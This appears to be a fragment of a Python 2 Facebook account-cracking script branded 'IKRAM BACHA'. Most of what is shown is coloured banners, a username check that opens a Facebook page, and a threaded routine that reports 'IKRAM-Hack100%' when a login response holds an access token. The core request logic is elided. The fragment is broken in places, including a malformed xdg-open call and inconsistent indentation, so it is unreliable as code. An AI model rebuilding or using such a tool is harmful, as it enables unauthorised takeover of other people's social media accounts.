...
♨️°───────(IKRAM BACHA)───────°♨️
\033[1;92m║══▒═✺═▒═✺═▒═══¤═¤═¤════════════¤═══║
\033[1;96m║✯ Creator ✯ IKRAM BACHA       ║    
\033[1;98m║✯ IKRAM BACHA           ║  
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            os.system('xdg-open https://www.facebook.com/khialm.faizy')
    else:
        print "\033[1;96mWrong Username"
        os.system('xdg-openhttps://www.facebook.com/khialm.faizy ')
...
def pilih_super():
	...
	if peak =="":
		...
		os.system('clear')
		print logo
		print "\033[1;97m•◈•═══\033[1;91m IKRAM_BACHA\033[1;97m═══•◈•"
		...
		print "\033[1;95m•◈•══════•◈\033[1;91m IKRAM_BACHA\033[1;95m◈•══════•◈•"
		try:
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				...
				z = json.loads(x.text)
				print '\x1b[1;94m[  ✓  ] \x1b[1;92m IKRAM-Hack100%'											
	...
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬•◈\033[1;91m IKRAM_BACHA\033[1;95m◈•▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By IKRAM_BACHA--•◈•---»" #Dev:IKRAM
